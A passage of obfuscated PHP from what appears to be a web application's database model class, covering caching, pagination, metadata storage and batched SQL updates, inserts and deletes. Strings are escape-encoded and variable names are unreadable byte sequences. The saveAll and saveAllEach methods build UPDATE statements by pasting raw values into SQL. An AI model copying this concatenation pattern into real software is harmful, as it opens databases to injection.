$this->query("\x73\150\x6f\167\40\x74\141\142\154\x65\x20\163\164\x61\x74\x75\163\x20\167\x68\x65\162\x65\x20\x4e\x61\x6d\145\75\x27{$’û×¥àğ}\47"); $–¾ÚºÄ› = $Õ¤ÌªÂİ[0][$_SERVER[¥ÙÌÜ¾ê][358]]; $£¢´ßàÇ = max($çûíËö±, $–¾ÚºÄ›); return $£¢´ßàÇ; } protected function _callBefore($‘«æÆÖÒ, $Üø¨¡İç) { return $this->cacheCallCheck($‘«æÆÖÒ, $Üø¨¡İç, !1); } protected function _callAfter($Ì£êÖ’, $ãÑ¶‘ôŸ) { return $this->cacheCallCheck($Ì£êÖ’, $ãÑ¶‘ôŸ, !0); } protected function cacheFunctionAlias($–œÊÂ·Ã) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($åÜÏ±”, $†âêí“Â, $§•÷® = false) { $“ƒÍ¹Àû = $this->cacheFunctionAlias($†âêí“Â); if (!$“ƒÍ¹Àû) { return; } foreach ($“ƒÍ¹Àû as $ÊøÉÛ°ï => $ç„ªÚ) { $šô‰æÃ« = $ç„ªÚ[0]; $±à¼Àø„ = explode($_SERVER[¥ÙÌÜ¾ê][47], $ç„ªÚ[1]); if ($åÜÏ±” == $ÊøÉÛ°ï) { return $this->cacheFunctionGet($ÊøÉÛ°ï, $šô‰æÃ«); } if ($§•÷® && in_array($åÜÏ±”, $±à¼Àø„)) { $this->cacheFunctionClear($ÊøÉÛ°ï, $šô‰æÃ«); } } } public function cacheFunctionGet($Ò¾œ, $¹éûˆÔ¼) { $Ùª¨öÄ¸ = $this->cacheKeyMake($Ò¾œ, $¹éûˆÔ¼); $åÓ°×¬Ù = Cache::get($Ùª¨öÄ¸); if (!is_array($åÓ°×¬Ù)) { $åÓ°×¬Ù = call_user_func_array(array($this, $Ò¾œ), array($¹éûˆÔ¼, !0)); Cache::set($Ùª¨öÄ¸, $åÓ°×¬Ù); } return $åÓ°×¬Ù; } public function cacheFunctionClear($Ã¹¥×ƒ¥, $ËÇıÈì«) { $©»šÈ©² = $ËÇıÈì«; if (!is_array($ËÇıÈì«)) { $©»šÈ©² = array($ËÇıÈì«); } foreach ($©»šÈ©² as $¶¯”‚Ï¼) { $”°®çş = $this->cacheKeyMake($Ã¹¥×ƒ¥, $¶¯”‚Ï¼); Cache::remove($”°®çş); } } private function cacheKeyMake($”Å Øü’, $«Òêš‹ù) { $­‰Æ¦»È =& $_SERVER[¥ÙÌÜ¾ê]; return get_class($this) . $­‰Æ¦»È[71] . $”Å Øü’ . $­‰Æ¦»È[359] . $«Òêš‹ù; } protected function selectPageReset() { $©ÊÂ×‹Ò =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($GLOBALS[$©ÊÂ×‹Ò[360]])) { return; } $GLOBALS[$©ÊÂ×‹Ò[360]] = isset($GLOBALS[$©ÊÂ×‹Ò[7]][$©ÊÂ×‹Ò[361]]) ? $GLOBALS[$©ÊÂ×‹Ò[7]][$©ÊÂ×‹Ò[361]] : !1; $GLOBALS[$©ÊÂ×‹Ò[362]] = isset($GLOBALS[$©ÊÂ×‹Ò[7]][$©ÊÂ×‹Ò[351]]) ? $GLOBALS[$©ÊÂ×‹Ò[7]][$©ÊÂ×‹Ò[351]] : !1; $GLOBALS[$©ÊÂ×‹Ò[7]][$©ÊÂ×‹Ò[361]] = !1; $GLOBALS[$©ÊÂ×‹Ò[7]][$©ÊÂ×‹Ò[351]] = !1; } protected function selectPageRestore() { $ˆéÚÒª€ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($GLOBALS[$ˆéÚÒª€[360]])) { return; } $GLOBALS[$ˆéÚÒª€[7]][$ˆéÚÒª€[361]] = $GLOBALS[$ˆéÚÒª€[360]]; $GLOBALS[$ˆéÚÒª€[7]][$ˆéÚÒª€[351]] = $GLOBALS[$ˆéÚÒª€[362]]; if ($GLOBALS[$ˆéÚÒª€[7]][$ˆéÚÒª€[361]] === !1) { unset($GLOBALS[$ˆéÚÒª€[7]][$ˆéÚÒª€[361]]); } if ($GLOBALS[$ˆéÚÒª€[7]][$ˆéÚÒª€[351]] === !1) { unset($GLOBALS[$ˆéÚÒª€[7]][$ˆéÚÒª€[351]]); } unset($GLOBALS[$ˆéÚÒª€[360]]); unset($GLOBALS[$ˆéÚÒª€[362]]); } protected function selectPage($š¦ûì§¤ = 200, $…ß–ÇŞ¬ = 1) { $ãğ‡¹í =& $_SERVER[¥ÙÌÜ¾ê]; global $in; $§Ï¥‘Ç³ = $this->optionsValue(); $˜ï–€Àş = 50000; $š¦ûì§¤ = isset($in[$ãğ‡¹í[361]]) && $in[$ãğ‡¹í[361]] ? $in[$ãğ‡¹í[361]] : $š¦ûì§¤; if ($š¦ûì§¤ === -1) { $in[$ãğ‡¹í[361]] = !1; $˜ï–€Àş = 100000000; $š¦ûì§¤ = $˜ï–€Àş; } $›Ú‚×À¡ = $§Ï¥‘Ç³; $›Ú‚×À¡[$ãğ‡¹í[363]] = array(); $š¦ûì§¤ = intval($š¦ûì§¤); $š¦ûì§¤ = $š¦ûì§¤ <= 5 ? 5 : ($š¦ûì§¤ >= $˜ï–€Àş ? $˜ï–€Àş : $š¦ûì§¤); $…ß–ÇŞ¬ = intval(isset($in[$ãğ‡¹í[351]]) && $in[$ãğ‡¹í[351]] ? $in[$ãğ‡¹í[351]] : $…ß–ÇŞ¬); $…ß–ÇŞ¬ = $…ß–ÇŞ¬ <= 1 ? 1 : $…ß–ÇŞ¬; $ÈÅ©·¥ = array(); $ÏòğŸÕ… = 1; if ($…ß–ÇŞ¬ == 1 && $ÏòğŸÕ…) { $this->optionsValue($§Ï¥‘Ç³); $ÈÅ©·¥ = $this->page($…ß–ÇŞ¬, $š¦ûì§¤)->select(); $ºÉ¢£š = is_array($ÈÅ©·¥) ? count($ÈÅ©·¥) : 0; if ($ºÉ¢£š < $š¦ûì§¤) { $Ş¦ı­÷¤ = 1; } else { $this->optionsValue($›Ú‚×À¡); $ºÉ¢£š = intval($this->count()); $Ş¦ı­÷¤ = ceil($ºÉ¢£š / $š¦ûì§¤); } } else { $this->optionsValue($›Ú‚×À¡); $ºÉ¢£š = intval($this->count()); $Ş¦ı­÷¤ = ceil($ºÉ¢£š / $š¦ûì§¤); $…ß–ÇŞ¬ = $…ß–ÇŞ¬ >= $Ş¦ı­÷¤ ? $Ş¦ı­÷¤ : $…ß–ÇŞ¬; $this->optionsValue($§Ï¥‘Ç³); $ÈÅ©·¥ = $this->page($…ß–ÇŞ¬, $š¦ûì§¤)->select(); } if (!is_array($ÈÅ©·¥)) { $ÈÅ©·¥ = array(); } if ($Ş¦ı­÷¤ == 1) { $ºÉ¢£š = count($ÈÅ©·¥); } $éÒ’‚Ê  = array($ãğ‡¹í[364] => array($ãğ‡¹í[365] => $ºÉ¢£š, $ãğ‡¹í[361] => $š¦ûì§¤, $ãğ‡¹í[351] => $…ß–ÇŞ¬, $ãğ‡¹í[366] => $Ş¦ı­÷¤), $ãğ‡¹í[367] => $ÈÅ©·¥); return $éÒ’‚Ê ; } protected function checkLength($£ş’ª, $ß†”‘’Æ = 0, $äÚ¶¯™ƒ = '') { $ó…¥Ò¢ó =& $_SERVER[¥ÙÌÜ¾ê]; $ß†”‘’Æ = $ß†”‘’Æ ? $ß†”‘’Æ : 65536; if (!$£ş’ª || strlen($£ş’ª) < $ß†”‘’Æ) { return; } $äÚ¶¯™ƒ = $äÚ¶¯™ƒ ? $äÚ¶¯™ƒ . $ó…¥Ò¢ó[68] : $ó…¥Ò¢ó[33]; show_json($äÚ¶¯™ƒ . LNG($ó…¥Ò¢ó[368]) . "\50{$ß†”‘’Æ}\x29", !1); } protected function metaSet($èÌ»—Ì—, $êè³‰î¨ = null, $©ÜÛšü = null) { $ø°êêµÉ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->tableMeta || !$èÌ»—Ì—) { return !1; } $İæÌíãÜ = $this->tableMeta[$ø°êêµÉ[369]]; $’¬ĞÆ›Ò = $this->tableMeta[$ø°êêµÉ[370]]; $´šÀ§¬ = Model($’¬ĞÆ›Ò); $´É‘Âˆ± = array($İæÌíãÜ => $èÌ»—Ì—, $ø°êêµÉ[371] => $êè³‰î¨); if (is_null($êè³‰î¨)) { return $´šÀ§¬->where(array($İæÌíãÜ => $èÌ»—Ì—))->delete(); } if (is_null($©ÜÛšü) && is_string($êè³‰î¨)) { return $´šÀ§¬->where($´É‘Âˆ±)->delete(); } $ËÏ£œñø = is_array($êè³‰î¨) ? $êè³‰î¨ : array(); if (is_string($êè³‰î¨)) { $ËÏ£œñø[$êè³‰î¨] = $©ÜÛšü; } $ÁÕ¤Óš = array(); foreach ($ËÏ£œñø as $“èğ¼Ø˜ => $Æë‚ìÅ) { if (is_null($Æë‚ìÅ) && is_string($“èğ¼Ø˜)) { $´šÀ§¬->where(array($İæÌíãÜ => $èÌ»—Ì—, $ø°êêµÉ[371] => $“èğ¼Ø˜))->delete(); continue; } $this->checkLength($Æë‚ìÅ, !1, $’¬ĞÆ›Ò . $ø°êêµÉ[4] . $“èğ¼Ø˜); $ÁÕ¤Óš[] = array($İæÌíãÜ => $èÌ»—Ì—, $ø°êêµÉ[93] => $“èğ¼Ø˜, $ø°êêµÉ[372] => $Æë‚ìÅ); } $ÂœæÔûä = $ø°êêµÉ[373] . $’¬ĞÆ›Ò; CacheLock::lock($ÂœæÔûä); $´šÀ§¬->where(array($İæÌíãÜ => $èÌ»—Ì—))->addAll($ÁÕ¤Óš, array(), !0); CacheLock::unlock($ÂœæÔûä); return !0; } public function metaGet($¿Ğªò¬, $§¶Ş¾õÉ = false) { $Ş’œÑ¢ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->tableMeta) { return array(); } $²Š­ğîÃ = $this->tableMeta[$Ş’œÑ¢[369]]; $†Èõâ…Á = Model($this->tableMeta[$Ş’œÑ¢[370]]); if ($§¶Ş¾õÉ) { $Ô‹’¯øä = array($²Š­ğîÃ => $¿Ğªò¬, $Ş’œÑ¢[93] => $§¶Ş¾õÉ); return $†Èõâ…Á->where($Ô‹’¯øä)->getField($Ş’œÑ¢[372]); } $Ô‹’¯øä = array($²Š­ğîÃ => $¿Ğªò¬); $É‚°…º = $†Èõâ…Á->field($Ş’œÑ¢[374])->where($Ô‹’¯øä)->select(); $É‚°…º = array_to_keyvalue($É‚°…º, $Ş’œÑ¢[93], $Ş’œÑ¢[372]); return $É‚°…º; } private function checkDataAutoHas($ªâ˜­¾) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $—ó¨›‘˜) { if (in_array($ªâ˜­¾, explode($_SERVER[¥ÙÌÜ¾ê][47], $—ó¨›‘˜[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$”üÑè¢â, $¥¡“†Ñ¤) { $æ®ŠÊ =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($this->dataAuto as $ËÈ¯»¾è) { $éÂ²…Òğ = $ËÈ¯»¾è[0]; if (!in_array($¥¡“†Ñ¤, explode($æ®ŠÊ[47], $ËÈ¯»¾è[2]))) { continue; } switch (trim($ËÈ¯»¾è[3])) { case $æ®ŠÊ[319]: case $æ®ŠÊ[320]: $€´Ğ¥õÁ = $ËÈ¯»¾è[1]; $äÔ€İ‰ = isset($ËÈ¯»¾è[4]) ? (array) $ËÈ¯»¾è[4] : array(); if ($€´Ğ¥õÁ == $æ®ŠÊ[197] && array_key_exists($éÂ²…Òğ, $”üÑè¢â)) { if (!$”üÑè¢â[$éÂ²…Òğ]) { unset($”üÑè¢â[$éÂ²…Òğ]); } break; } if (isset($”üÑè¢â[$éÂ²…Òğ])) { array_unshift($äÔ€İ‰, $”üÑè¢â[$éÂ²…Òğ]); } if ($æ®ŠÊ[319] == $ËÈ¯»¾è[3]) { $”üÑè¢â[$éÂ²…Òğ] = call_user_func_array($€´Ğ¥õÁ, $äÔ€İ‰); } else { $”üÑè¢â[$éÂ²…Òğ] = call_user_func_array(array(&$this, $€´Ğ¥õÁ), $äÔ€İ‰); } break; case $æ®ŠÊ[268]: if (isset($”üÑè¢â[$éÂ²…Òğ]) && $”üÑè¢â[$éÂ²…Òğ]) { $”üÑè¢â[$éÂ²…Òğ] = call_user_func_array(array(&$this, $ËÈ¯»¾è[1]), array($”üÑè¢â[$éÂ²…Òğ])); } break; case $æ®ŠÊ[271]: $”üÑè¢â[$éÂ²…Òğ] = $”üÑè¢â[$ËÈ¯»¾è[1]]; break; case $æ®ŠÊ[292]: if (isset($”üÑè¢â[$éÂ²…Òğ]) && !is_string($”üÑè¢â[$éÂ²…Òğ])) { $”üÑè¢â[$éÂ²…Òğ] = json_encode_force($”üÑè¢â[$éÂ²…Òğ]); } break; case $æ®ŠÊ[321]: if ($”üÑè¢â[$éÂ²…Òğ] === $æ®ŠÊ[33]) { unset($”üÑè¢â[$éÂ²…Òğ]); } break; case $æ®ŠÊ[322]: $”üÑè¢â[$éÂ²…Òğ] = $ËÈ¯»¾è[1]; default: break; } } if ($¥¡“†Ñ¤ == $æ®ŠÊ[353]) { $¾»ÌÇ = strtolower($this->db->getDbType()); if (strpos($¾»ÌÇ, $æ®ŠÊ[9]) !== 0) { return; } $µ„øÍÊİ = $this->field(!0)->fields; $÷óŸ´ú× = $µ„øÍÊİ[$æ®ŠÊ[250]]; if (isset($µ„øÍÊİ[$æ®ŠÊ[249]])) { unset($÷óŸ´ú×[$µ„øÍÊİ[$æ®ŠÊ[249]]]); } foreach ($÷óŸ´ú× as $Í™¼™ã => $¥¡“†Ñ¤) { if (!isset($”üÑè¢â[$Í™¼™ã])) { $”üÑè¢â[$Í™¼™ã] = $æ®ŠÊ[33]; } } } } private function dataAfterFilter(&$ü‡Ëìçˆ) { $¦æŠ¡Ü =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($this->dataAuto as $ËÄØ÷¡Ş) { $õƒôüÏ€ = $ËÄØ÷¡Ş[0]; if (!isset($ü‡Ëìçˆ[$õƒôüÏ€])) { continue; } if (!in_array($¦æŠ¡Ü[355], explode($¦æŠ¡Ü[47], $ËÄØ÷¡Ş[2]))) { continue; } switch (trim($ËÄØ÷¡Ş[3])) { case $¦æŠ¡Ü[319]: case $¦æŠ¡Ü[320]: $èŸùå»Î = isset($ËÄØ÷¡Ş[4]) ? (array) $ËÄØ÷¡Ş[4] : array(); array_unshift($èŸùå»Î, $ü‡Ëìçˆ[$õƒôüÏ€]); if (isset($ËÄØ÷¡Ş[4]) && $ËÄØ÷¡Ş[4] == $¦æŠ¡Ü[375]) { $èŸùå»Î = array($ü‡Ëìçˆ[$õƒôüÏ€]); } if ($¦æŠ¡Ü[319] == $ËÄØ÷¡Ş[3]) { $ü‡Ëìçˆ[$õƒôüÏ€] = call_user_func_array($ËÄØ÷¡Ş[1], $èŸùå»Î); } else { $ü‡Ëìçˆ[$õƒôüÏ€] = call_user_func_array(array(&$this, $ËÄØ÷¡Ş[1]), $èŸùå»Î); } break; case $¦æŠ¡Ü[268]: if (isset($ü‡Ëìçˆ[$õƒôüÏ€]) && $ü‡Ëìçˆ[$õƒôüÏ€]) { $ü‡Ëìçˆ[$õƒôüÏ€] = call_user_func_array(array(&$this, $ËÄØ÷¡Ş[1]), array($ü‡Ëìçˆ[$õƒôüÏ€])); } break; case $¦æŠ¡Ü[271]: $ü‡Ëìçˆ[$õƒôüÏ€] = $ü‡Ëìçˆ[$ËÄØ÷¡Ş[1]]; break; case $¦æŠ¡Ü[292]: $ü±ÜÓû¯ = $ü‡Ëìçˆ[$õƒôüÏ€]; $ü‡Ëìçˆ[$õƒôüÏ€] = json_decode($ü±ÜÓû¯, !0); if (is_null($ü‡Ëìçˆ[$õƒôüÏ€])) { $ü‡Ëìçˆ[$õƒôüÏ€] = $ü±ÜÓû¯; } break; case $¦æŠ¡Ü[321]: if ($ü‡Ëìçˆ[$õƒôüÏ€] === $¦æŠ¡Ü[33]) { unset($ü‡Ëìçˆ[$õƒôüÏ€]); } break; case $¦æŠ¡Ü[322]: $ü‡Ëìçˆ[$õƒôüÏ€] = $ËÄØ÷¡Ş[1]; break; default: break; } } } public function saveAll($İ„‹ßƒì) { $€åòÄ©û =& $_SERVER[¥ÙÌÜ¾ê]; $™ƒïÄÏ = $this->tablePrefix . $this->tableName; $±ûæÚÛ® = self::SQL_WHERE_IN_CHUNK; $İ„‹ßƒì = is_array($İ„‹ßƒì) ? $İ„‹ßƒì : array(); $ŞåŠµ¨³ = $€åòÄ©û[376]; $ô³“÷¿ = 0; $î´çƒ¹Ç = array(); $¯ÖÙí¾‹ = count($İ„‹ßƒì); for ($ƒæ‡¿ÉÄ = 0; $ƒæ‡¿ÉÄ < $¯ÖÙí¾‹; $ƒæ‡¿ÉÄ++) { $ÚÇé—æõ = $İ„‹ßƒì[$ƒæ‡¿ÉÄ]; if (!is_array($ÚÇé—æõ) || count($ÚÇé—æõ) != 4) { continue; } $Ë’ü®• = "\125\x50\x44\x41\124\105\40\140{$™ƒïÄÏ}\x60\x20\x53\105\x54\40{$ÚÇé—æõ[2]}\40\75\40\103\101\x53\x45\40{$ÚÇé—æõ[0]}\40\12"; if ($ô³“÷¿ == 0) { $ŞåŠµ¨³ = $Ë’ü®•; } $î´çƒ¹Ç[] = $€åòÄ©û[116] . $ÚÇé—æõ[1] . $€åòÄ©û[116]; $ô³“÷¿++; $ŞåŠµ¨³ .= "\x20\x57\x48\105\116\40\47{$ÚÇé—æõ[1]}\x27\x20\124\x48\x45\x4e\x20\x27{$ÚÇé—æõ[3]}\x27\40\xa"; if ($ô³“÷¿ == $±ûæÚÛ® || $ƒæ‡¿ÉÄ == $¯ÖÙí¾‹ - 1) { $²ÂöÈ¾© = implode($€åòÄ©û[47], $î´çƒ¹Ç); $ŞåŠµ¨³ .= "\40\x45\116\104\40\x20\x57\x48\x45\x52\105\x20{$ÚÇé—æõ[0]}\x20\x49\116\40\50{$²ÂöÈ¾©}\x29\x20"; $this->execute($ŞåŠµ¨³); $ô³“÷¿ = 0; $ŞåŠµ¨³ = $Ë’ü®•; $this->chunkEventCheck(count($î´çƒ¹Ç)); $î´çƒ¹Ç = array(); } } $this->chunkEventSet(); } public function saveAllEach($¿áñÒ­à) { $È›ß¡¼ =& $_SERVER[¥ÙÌÜ¾ê]; $–œ»äáÁ = $this->tablePrefix . $this->tableName; foreach ($¿áñÒ­à as $Ï´±ø Ä) { if (!is_array($Ï´±ø Ä) || count($Ï´±ø Ä) != 4) { continue; } $øı•«¶Ç = $Ï´±ø Ä[0] . $È›ß¡¼[377] . $Ï´±ø Ä[1] . $È›ß¡¼[116]; $ªŒ¤Ìô¡ = $Ï´±ø Ä[2] . $È›ß¡¼[377] . $Ï´±ø Ä[3] . $È›ß¡¼[116]; $½óóÑ°˜ = "\x75\x70\x64\x61\x74\145\40{$–œ»äáÁ}\40\x73\145\164\x20{$ªŒ¤Ìô¡}\40\x77\150\145\x72\x65\40{$øı•«¶Ç}\73"; $this->execute($½óóÑ°˜); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Úƒ´Üç = false, $×›ï°¡ = false) { $this->_chunkEvent = $Úƒ´Üç; $this->_chunkEventParam = $×›ï°¡; } private function chunkEventCheck($ää¬©ö®) { if (!$this->_chunkEvent) { return; } $½®ÔñØÒ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $½®ÔñØÒ[$_SERVER[¥ÙÌÜ¾ê][378]] = $ää¬©ö®; Hook::trigger($this->_chunkEvent, $½®ÔñØÒ); } public function addAll($¿ÛÍÓÍ•, $€ô£µûô = array(), $‘ÈŞ× = false) { $¸œÈ³¢à =& $_SERVER[¥ÙÌÜ¾ê]; ignore_timeout(); $Öš•ßÜ‚ = self::SQL_WHERE_IN_CHUNK; if (empty($¿ÛÍÓÍ•)) { $this->error = think_lang($¸œÈ³¢à[269]); return !1; } $€ô£µûô = $this->_parseOptions($€ô£µûô); foreach ($¿ÛÍÓÍ• as $”à£ÒŞ => $ºšñÄÂÙ) { $¿ÛÍÓÍ•[$”à£ÒŞ] = $this->_facade($ºšñÄÂÙ); $this->_beforeInsert($¿ÛÍÓÍ•[$”à£ÒŞ], $€ô£µûô); } if (method_exists($this->db, $¸œÈ³¢à[270])) { for ($ƒ•Ú£Ÿ« = 0; $ƒ•Ú£Ÿ« < count($¿ÛÍÓÍ•); $ƒ•Ú£Ÿ« += $Öš•ßÜ‚) { $¸î”–´Ô = array_slice($¿ÛÍÓÍ•, $ƒ•Ú£Ÿ«, $Öš•ßÜ‚); if (!is_array($¸î”–´Ô) || count($¸î”–´Ô) == 0) { break; } $ïµª Í = $this->db->insertAll($¸î”–´Ô, $€ô£µûô, $‘ÈŞ×); $this->chunkEventCheck(count($¸î”–´Ô)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¿ÛÍÓÍ• as $”à£ÒŞ => $ºšñÄÂÙ) { $ïµª Í = $this->db->insert($ºšñÄÂÙ, $€ô£µûô, $‘ÈŞ×); } $this->commit(); } if (!1 !== $ïµª Í) { $¸ÁûÄÊ‹ = $this->getLastInsID(); if ($¸ÁûÄÊ‹) { return $¸ÁûÄÊ‹; } } return $ïµª Í; } public function save($±ãëºÈ = '', $òôùÒ“Ù = array()) { $Œš˜¶¤ã =& $_SERVER[¥ÙÌÜ¾ê]; $ñæ‹ê˜ = self::SQL_WHERE_IN_CHUNK; $˜õà²»é = $this->optionsValue(); $²ñŸ·ª¿ = $this->findWhereField($˜õà²»é); if (!$²ñŸ·ª¿) { return parent::save($±ãëºÈ, $òôùÒ“Ù); } $«ğ–¯¢’ = 0; $èß‡‘Íš = $˜õà²»é[$Œš˜¶¤ã[273]][$²ñŸ·ª¿][1]; $èß‡‘Íš = is_array($èß‡‘Íš) ? $èß‡‘Íš : array(); $¿‚òÄÙö = count($èß‡‘Íš); for ($•é¯Şõ = 0; $•é¯Şõ < $¿‚òÄÙö; $•é¯Şõ += $ñæ‹ê˜) { $æäÖšäÎ = array_slice($èß‡‘Íš, $•é¯Şõ, $ñæ‹ê˜); if (!is_array($æäÖšäÎ) || count($æäÖšäÎ) == 0) { break; } $˜õà²»é[$Œš˜¶¤ã[273]][$²ñŸ·ª¿][1] = $æäÖšäÎ; $this->optionsValue($˜õà²»é); $«ğ–¯¢’ += parent::save($±ãëºÈ, $òôùÒ“Ù); $this->chunkEventCheck(count($æäÖšäÎ)); } $this->chunkEventSet(); return $«ğ–¯¢’; } public function add($™›º†Ü¬ = '', $…èë¶„ó = array(), $äº©¢çÇ = false) { if ($this->addTaskStatus && is_array($™›º†Ü¬)) { $this->addTaskData[] = $™›º†Ü¬; return; } return parent::add($™›º†Ü¬, $…èë¶„ó, $äº©¢çÇ); } public function parseWhereLike($é‰ÜµÕ, $ÆşÀšß‘ = '', $¸¶€¸Ã = false, &$Û«Ä›‚Ô = false) { $şĞ«•‡¨ =& $_SERVER[¥ÙÌÜ¾ê]; $Å¸¢µÑ› = $GLOBALS[$şĞ«•‡¨[6]][$şĞ«•‡¨[379]]; if (!$Å¸¢µÑ›[$şĞ«•‡¨[380]]) { return $é‰ÜµÕ; } if (!is_array($é‰ÜµÕ)) { return $é‰ÜµÕ; } $óÖãœ = array(); $¹İıµĞë = 0; foreach ($é‰ÜµÕ as $ŒíÊ»˜ => $øŠÍ«Ÿ—) { if (is_array($øŠÍ«Ÿ—) && count($øŠÍ«Ÿ—) == 2 && $øŠÍ«Ÿ—[0] == $şĞ«•‡¨[381] && is_string($øŠÍ«Ÿ—[1]) && substr($øŠÍ«Ÿ—[1], 0, 1) == $şĞ«•‡¨[382] && substr($øŠÍ«Ÿ—[1], strlen($øŠÍ«Ÿ—[1]) - 1, 1) == $şĞ«•‡¨[382]) { $Û«Ä›‚Ô = !0; $¥‡Š˜İ = is_string($ŒíÊ»˜) ? $ŒíÊ»˜ : $ÆşÀšß‘; $”åçÑı = substr($øŠÍ«Ÿ—[1], 1, strlen($øŠÍ«Ÿ—[1]) - 2); $”åçÑı = $this->db->escapeString($”åçÑı); if (!strpos($¥‡Š˜İ, $şĞ«•‡¨[95])) { $¥‡Š˜İ = $şĞ«•‡¨[383] . $¥‡Š˜İ . $şĞ«•‡¨[383]; } $©€„şš¼ = $şĞ«•‡¨[182] . $”åçÑı . $şĞ«•‡¨[182]; if ($Å¸¢µÑ›[$şĞ«•‡¨[384]]) { $©€„şš¼ = $şĞ«•‡¨[385] . $”åçÑı . $şĞ«•‡¨[386]; if ($Å¸¢µÑ›[$şĞ«•‡¨[387]]) { $©€„şš¼ = $şĞ«•‡¨[386] . $”åçÑı . $şĞ«•‡¨[385]; } } $óÖãœ[$¹İıµĞë] = $şĞ«•‡¨[388] . $¥‡Š˜İ . $şĞ«•‡¨[389] . $©€„şš¼ . $şĞ«•‡¨[390]; $¹İıµĞë++; continue; } if (is_array($øŠÍ«Ÿ—)) { $ÆşÀšß‘ = is_string($ŒíÊ»˜) ? $ŒíÊ»˜ : $ÆşÀšß‘; $øŠÍ«Ÿ— = $this->parseWhereLike($øŠÍ«Ÿ—, $ÆşÀšß‘, !0, $Û«Ä›‚Ô); } if (is_numeric($ŒíÊ»˜)) { $óÖãœ[$¹İıµĞë] = $øŠÍ«Ÿ—; $¹İıµĞë++; } else { $óÖãœ[$ŒíÊ»˜] = $øŠÍ«Ÿ—; } } if ($Û«Ä›‚Ô && !$¸¶€¸Ã) { } return $óÖãœ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($±âıîì· = array()) { $¡ÍÀÛ½Á =& $_SERVER[¥ÙÌÜ¾ê]; $Œİ›ãüË = self::SQL_WHERE_IN_CHUNK; $Ô´—í­³ = $this->optionsValue(); $Ûé‰şæ¼ = $this->findWhereField($Ô´—í­³); if (!$Ûé‰şæ¼ || isset($Ô´—í­³[$¡ÍÀÛ½Á[290]]) || isset($Ô´—í­³[$¡ÍÀÛ½Á[351]])) { return parent::select($±âıîì·); } $¬¨Ìşë› = $Ô´—í­³[$¡ÍÀÛ½Á[273]][$Ûé‰şæ¼][1]; $¬¨Ìşë› = is_array($¬¨Ìşë›) ? $¬¨Ìşë› : array(); $É¹ûï¸ = null; for ($ƒ±Šû« = 0; $ƒ±Šû« < count($¬¨Ìşë›); $ƒ±Šû« += $Œİ›ãüË) { $õåçÎÉ´ = array_slice($¬¨Ìşë›, $ƒ±Šû«, $Œİ›ãüË); if (!is_array($õåçÎÉ´) || count($õåçÎÉ´) == 0) { break; } $Ô´—í­³[$¡ÍÀÛ½Á[273]][$Ûé‰şæ¼][1] = $õåçÎÉ´; $this->optionsValue($Ô´—í­³); $ÆÜ¯í¾ß = parent::select($±âıîì·); if (!$ÆÜ¯í¾ß) { continue; } $É¹ûï¸ = is_array($É¹ûï¸) ? $É¹ûï¸ : array(); $É¹ûï¸ = array_merge($É¹ûï¸, $ÆÜ¯í¾ß); } return $É¹ûï¸; } public function delete($¢ŞÙæ¿ = array()) { $ÓÄ¸¾–ï =& $_SERVER[¥ÙÌÜ¾ê]; $Ã‹¦†¡ = self::SQL_WHERE_IN_CHUNK; $ÅÇ¤ì­Ò = $this->optionsValue(); $¯åû™·Û = $this->findWhereField($ÅÇ¤ì­Ò); if (!$¯åû™·Û) { return parent::delete($¢ŞÙæ¿); } $áÆÂ’°” = 0; $èÀÓø– = $ÅÇ¤ì­Ò[$ÓÄ¸¾–ï[273]][$¯åû™·Û][1]; $èÀÓø– = is_array($èÀÓø–) ? $èÀÓø– : array(); for ($·‘¤ûœ = 0; $·‘¤ûœ < count($èÀÓø–); $·‘¤ûœ += $Ã‹¦†¡) { $¨ßçƒÃˆ = array_slice($èÀÓø–, $·‘¤ûœ, $Ã‹¦†¡); if (!is_array($¨ßçƒÃˆ) || count($¨ßçƒÃˆ) == 0) { break; } $ÅÇ¤ì­Ò[$ÓÄ¸¾–ï[273]][$¯åû™·Û][1] = $¨ßçƒÃˆ; $this->optionsValue($ÅÇ¤ì­Ò); $áÆÂ’°” += parent::delete($¢ŞÙæ¿); } return $áÆÂ’°”; } private function findWhereField($àªìàó) { $ş¿¾ÄÃî =& $_SERVER[¥ÙÌÜ¾ê]; $Ğ…º©ô¨ = self::SQL_WHERE_IN_CHUNK; if (!is_array($àªìàó) || !is_array($àªìàó[$ş¿¾ÄÃî[273]])) { return !1; } foreach ($àªìàó[$ş¿¾ÄÃî[273]] as $¼˜Œ÷«Ö => $Ñ¹¢Ú¢÷) { if (is_array($Ñ¹¢Ú¢÷) && isset($Ñ¹¢Ú¢÷[0]) && is_string($Ñ¹¢Ú¢÷[0]) && strtolower($Ñ¹¢Ú¢÷[0]) == $ş¿¾ÄÃî[7] && is_array($Ñ¹¢Ú¢÷[1]) && count($Ñ¹¢Ú¢÷[1]) > $Ğ…º©ô¨) { ignore_timeout(); return $¼˜Œ÷«Ö; } } return !1; } public function setMasterDB($§ØÕ‡ÌÍ = true) { think_config($_SERVER[¥ÙÌÜ¾ê][391], $§ØÕ‡ÌÍ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\155\x4f\x70\x74\151\157\x6e"; public $field = array(); public function listData($›»²º× = false, $¯³ğÊ†ô = "\x6d\157\144\151\x66\x79\124\151\x6d\145", $…ÙÔ§ß˜ = false) { $‚Êå‹ÜŸ = Model($this->modelType)->get(!1, $this->optionType, !0); $œÖåÀÚŒ = array_values($‚Êå‹ÜŸ); if ($œÖåÀÚŒ && $œÖåÀÚŒ[0] && !is_array($œÖåÀÚŒ[0])) { Model($this->modelType)->cacheRemove($this->optionType); 